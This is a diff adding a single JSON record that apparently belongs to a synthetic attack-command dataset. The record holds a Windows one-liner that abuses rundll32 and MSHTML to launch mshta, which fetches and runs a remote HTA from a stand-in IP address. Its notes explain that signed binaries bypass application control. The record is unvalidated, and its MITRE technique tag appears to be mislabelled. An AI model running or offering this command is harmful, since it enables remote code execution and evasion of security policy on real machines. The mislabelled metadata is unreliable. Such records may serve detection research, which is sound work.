@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1216",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";new ActiveXObject(\"WScript.Shell\").Run(\"mshta http://203.0.113.5/agent.hta\")",
+  "explanation": "Proxies execution via rundll32+MSHTML to spawn mshta, which runs a remote HTA. Both binaries are native and signed, often allowed by policy enforcement.",
+  "rationale_steps": [
+    "Invoke MSHTML RunHTMLApplication through rundll32 from PowerShell.",
+    "Inside JScript, create WScript.Shell and spawn mshta to retrieve and run a remote HTA.",
+    "Application control is bypassed through trusted loaders; detection hinges on unusual command-line parameters and remote HTA usage."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1216-fce25ec9-0ea9b99a",
+  "source_prompt_hash": "fce25ec9",
+  "timestamp_utc": "2025-09-30T07:05:43.585605Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
